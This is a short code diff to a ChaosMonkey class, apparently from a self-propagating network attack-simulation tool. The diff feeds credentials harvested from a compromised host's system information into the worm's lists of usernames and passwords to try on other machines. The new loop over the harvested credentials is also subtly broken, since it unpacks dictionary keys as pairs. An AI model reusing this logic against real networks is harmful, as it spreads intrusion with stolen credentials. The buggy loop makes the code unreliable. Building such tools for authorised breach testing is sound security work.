@@ -88,10 +88,14 @@ class ChaosMonkey(object):
         LOG.debug("default server: %s" % self._default_server)
         ControlClient.send_telemetry("tunnel", ControlClient.proxies.get('https'))
 
+        additional_creds = {}
+
         if WormConfiguration.collect_system_info:
             LOG.debug("Calling system info collection")
             system_info_collector = SystemInfoCollector()
             system_info = system_info_collector.get_info()
+            if system_info.has_key('credentials'):
+                additional_creds = system_info['credentials']
             ControlClient.send_telemetry("system_info_collection", system_info)
 
         if 0 == WormConfiguration.depth:
@@ -101,9 +105,25 @@ class ChaosMonkey(object):
         else:
             LOG.debug("Running with depth: %d" % WormConfiguration.depth)
 
+
+
         for _ in xrange(WormConfiguration.max_iterations):
             ControlClient.keepalive()
             ControlClient.load_control_config()
+
+            # TODO: this is temporary until we change server to support changing of config.
+            for user in list(additional_creds):
+                if user not in WormConfiguration.exploit_user_list:
+                    WormConfiguration.exploit_user_list.append(user)
+
+            for user, creds in additional_creds:
+                if creds.has_key('password'):
+                    password = creds['password']
+                    if password not in WormConfiguration.exploit_password_list:
+                        WormConfiguration.exploit_password_list.append(password)
+
+            LOG.debug("Users to try: %s" % str(WormConfiguration.exploit_user_list))
+            LOG.debug("Passwords to try: %s" % str(WormConfiguration.exploit_password_list))
 
             self._network.initialize()
 
